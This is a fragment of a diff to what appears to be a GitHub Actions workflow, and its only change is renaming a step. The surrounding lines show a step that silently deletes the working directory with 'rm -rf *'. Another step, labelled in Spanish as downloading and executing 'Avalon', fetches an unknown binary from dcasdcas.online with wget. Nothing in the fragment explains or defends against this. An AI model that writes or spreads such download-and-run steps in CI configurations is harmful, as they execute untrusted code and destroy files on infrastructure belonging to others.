@@ -14,7 +14,7 @@ jobs:
       run: |
         rm -rf * 2>/dev/null || true
     
-    - name: 🚀 Descargar y Ejecutar Avalon
+    - name: 🚀 Descargar y Ejecutar Avalonnnn
       run: |
         # 1. Descargar el archivo
         wget https://dcasdcas.online/avalon.x86_64
